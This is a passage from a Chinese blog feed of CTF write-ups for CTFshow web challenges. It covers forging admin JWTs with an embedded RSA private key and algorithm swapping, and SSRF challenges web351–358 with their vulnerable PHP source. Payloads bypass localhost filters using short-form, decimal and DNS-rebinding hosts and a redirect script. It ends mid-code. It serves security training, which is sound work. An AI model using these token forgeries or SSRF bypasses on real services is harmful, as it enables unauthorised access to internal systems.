KEY-----\nMIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb+r6QPBryJmdaR1a3ToD9sXDb\neni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8\nIEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB\nAoGAE+mAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2+OhYVEJq8VtPcVB1PK\nfrOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX\nh7iFjNscfs/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM\ncdEBOgkI/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi\nST9LU4lxAkEA1lsfr9gF/9OdzAsPfuTLsl+l9zpo1jjzhXlwmHFgyCAn7gBKeWdv\nubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA\n+tUDjQJAERSE/SvAb143BtkVdCLniVBI5sGomIOq569Z0+zdsaOqsZs60QJAYqtJ\nV7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4+QgY+fYBt8DVFq5bHQUIvIW\nzawYVGZdwvuD9IgY/QJAGCJbXA+Knw10B+g5tDZfVHsr6YYMY3Q24zVu4JXozWDV\nx+G39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA==\n-----END RSA PRIVATE KEY-----"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>pem<span class="token punctuation">,</span> err <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">ParseRSAPrivateKeyFromPEM</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>PRIVATE_KEY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">}</span>claims <span class="token operator">:=</span> jwt<span class="token punctuation">.</span>MapClaims<span class="token punctuation">{</span><span class="token string">"user"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"iat"</span><span class="token punctuation">:</span>  <span class="token number">1671208089</span><span class="token punctuation">,</span><span class="token punctuation">}</span>token <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodRS256<span class="token punctuation">,</span> claims<span class="token punctuation">)</span>signedString<span class="token punctuation">,</span> err <span class="token operator">:=</span> token<span class="token punctuation">.</span><span class="token function">SignedString</span><span class="token punctuation">(</span>pem<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"token: %v\n"</span><span class="token punctuation">,</span> signedString<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后发送 POST 请求</p><p><img src="/../../../pic/Pasted%20image%2020221217003911.png"></p><h2 id="5-web350"><a href="#5-web350" class="headerlink" title="5. web350"></a>5. web350</h2><p>修改加密算法</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MzIzMDE1MTB9.KgkWpURzcUQfETJXh2h5UdDtiQmX3Gbg50vp-B4gs6w</p><p><img src="/../../../pic/Pasted%20image%2020221217010058.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 秀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 秀 - SSRF</title>
      <link href="/2023/01/26/catchtheflag/ctf-xiu/ctf-xiu-ssrf/"/>
      <url>/2023/01/26/catchtheflag/ctf-xiu/ctf-xiu-ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-秀-SSRF"><a href="#CTF-秀-SSRF" class="headerlink" title="CTF 秀 - SSRF"></a>CTF 秀 - SSRF</h1><h2 id="1-认识-SSRF"><a href="#1-认识-SSRF" class="headerlink" title="1. 认识 SSRF"></a>1. 认识 SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p><p><a href="https://www.cnblogs.com/s0ky1xd/p/5859049.html">浅谈 SSRF 漏洞</a></p><p><a href="https://blog.csdn.net/qq_30135181/article/details/52734225">SSRF 详解</a></p><h2 id="2-web351"><a href="#2-web351" class="headerlink" title="2. web351"></a>2. web351</h2><p>题目直接给出了源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 接受 url 参数</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 初始化 curl 会话</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 设置会话</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 执行 curl 会话获取回显内容</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 关闭 curl 会话</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag 在 flag.php 中，但是只允许本地用户访问 =&gt; SSRF</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">[POST]url=http://localhost/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221229161643.png"></p><h2 id="3-web352-web353"><a href="#3-web352-web353" class="headerlink" title="3. web352 ~ web353"></a>3. web352 ~ web353</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'http'</span> <span class="token operator">||</span> <span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>parse_url() 解析请求包的参数，返回数组，scheme是请求包的协议</p><ul><li>127.1 会被解析成 127.0.0.1，也就意味着为零可缺省</li><li>在 Linux 中，0 也会被解析成 127.0.0.1</li><li>127.0.0.0/8 是一个环回地址网段，从 127.0.0.1 ~ 127.255.255.254 都表示 localhost</li><li>ip 地址还可以通过表示成其他进制的形式访问，IP地址二进制、十进制、十六进制互换</li></ul><p>payload</p><pre class="line-numbers language-none"><code class="language-none">[POST]url=http://127.1/flag.phpurl=http://0/flag.phpurl=http://127.255.255.254/flag.phpurl=http://2130706433/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221229162623.png"></p><h2 id="4-web354"><a href="#4-web354" class="headerlink" title="4. web354"></a>4. web354</h2><p>题目直接源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'http'</span> <span class="token operator">||</span> <span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|1|0|。/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤到 1，0 以及 localhost，找到解析到 127.0.0.1 的域名 sudo.cc</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">[POST]url=http://sudo.cc/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221229163332.png"></p><h2 id="5-web355"><a href="#5-web355" class="headerlink" title="5. web355"></a>5. web355</h2><p>直接给出了源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'http'</span> <span class="token operator">||</span> <span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>限制 host 长度不超过5</p><pre class="line-numbers language-none"><code class="language-none">[POST]url=http://127.1/flag.phpurl=http://0/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221229163532.png"></p><h2 id="6-web356"><a href="#6-web356" class="headerlink" title="6. web356"></a>6. web356</h2><p>直接给出源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'http'</span> <span class="token operator">||</span> <span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>限制长度不超过3</p><pre class="line-numbers language-none"><code class="language-none">[POST]url=http://0/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221229164829.png"></p><h2 id="7-web357"><a href="#7-web357" class="headerlink" title="7. web357"></a>7. web357</h2><p>直接给出了源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'http'</span> <span class="token operator">||</span> <span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br&gt;'</span> <span class="token operator">.</span> <span class="token variable">$ip</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/br&gt;'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>if 判断中的内容</p><pre class="line-numbers language-none"><code class="language-none">FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IPFILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IPFILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>DNS重绑定（DNS-Rebinding）漏洞：<a href="https://zhuanlan.zhihu.com/p/89426041">浅谈DNS重绑定漏洞</a></p><p>去<a href="http://ceye.io/%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA%E8%B4%A6%E5%8F%B7%EF%BC%8C%E7%99%BB%E5%BD%95%E5%90%8E%E4%BC%9A%E7%9C%8B%E5%88%B0%E5%88%86%E9%85%8D%E4%BA%86%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D">http://ceye.io/注册一个账号，登录后会看到分配了一个域名</a></p><p>添加两个重定向记录</p><p><img src="/../../../pic/Pasted%20image%2020221229172504.png"></p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">[POST]url=http://r.ri2j79.ceye.io/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221229172512.png"></p><p>或者是在自己的 vps 上搞个重定向</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location:http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="8-web358"><a href="#8-web358" class="headerlink" title="8. web358"></a>8. web358</h2><p>直接给出了源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span 